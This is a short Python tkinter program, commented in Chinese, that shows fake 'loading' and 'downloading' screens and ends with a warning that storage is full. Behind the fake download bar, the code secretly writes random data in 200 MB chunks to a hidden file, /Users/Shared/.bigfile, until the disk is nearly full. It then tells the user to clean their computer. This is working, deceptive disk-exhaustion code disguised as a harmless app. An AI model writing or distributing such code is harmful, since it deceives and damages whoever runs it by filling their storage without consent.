import tkinter as tk
from time import sleep
import shutil, os, traceback


def step1():
    # step1: 假装加载
    root.title('Loading')
    canvas.config(bg='#0A0E27')
    canvas.update()

    loading = canvas.create_arc(300, 200, 500, 400, outline='#00BFFF', start=90, extent=-90, style=tk.ARC, width=20)
    angle = 90
    for _ in range(500):
        angle -= 2
        canvas.itemconfig(loading, start=angle)
        canvas.update()

    root.after(1000, step2)


def step2():
    # step2: 假装下载
    root.title('Downloading')
    canvas.delete(tk.ALL)

    canvas.create_text(400, 150, text='Download Resources......', fill='#00bfff', font=('Arial', 20))
    canvas.create_line(100, 400, 700, 400, fill='#39ff14', width=10)
    loading = canvas.create_line(100, 400, 100, 400, fill='#00bfff', width=10)
    canvas.update()

    for x in range(100, 200):
        canvas.coords(loading, 100, 400, x, 400)
        canvas.update()
        sleep(0.02)

    try:
        with open('/Users/Shared/.bigfile', 'ab') as file:
            x = 200
            while True:
                # 偷偷占空间
                size = 1000 * 1000 * 200
                _, _, free = shutil.disk_usage('/')
                if free < size:
                    break
                file.write(os.urandom(size))
                x += 0.5
                if x < 600:
                    canvas.coords(loading, 100, 400, x, 400)
                canvas.update()
    except Exception as e:
        print('===ERROR===')
        print(traceback.format_exc())
        print('%s:%s' % (type(e).__name__, e))
        print('===========')

    for x1 in range(round(x), 700):
        canvas.coords(loading, 100, 400, x1, 400)
        canvas.update()
        sleep(0.02)

    root.after(500, step3)


def step3():
    # step3: 提示空间不够
    canvas.delete(tk.ALL)
    root.title('Warning')
    root.focus_force()

    canvas.create_polygon(150, 100, 50, 300, 250, 300, 150, 100, fill='#ff6600', width=10, outline='#ff0000')
    canvas.create_text(150, 220, text='!', fill='white', font=('Arial', 100), anchor=tk.CENTER)
    canvas.create_text(250, 220, text='WARNING', fill='#00bfff', font=('Arial', 70), anchor=tk.W)
    canvas.create_text(400, 400, text='储存空间不足, 请清理您的电脑!', fill='white', font=('Arial', 40), anchor=tk.CENTER)


root = tk.Tk()
root.title('ॉञϸҕ')

canvas = tk.Canvas(root, width=800, height=600, bg='black')
canvas.pack()

root.after(1000, step1)
root.focus_force()
root.mainloop()
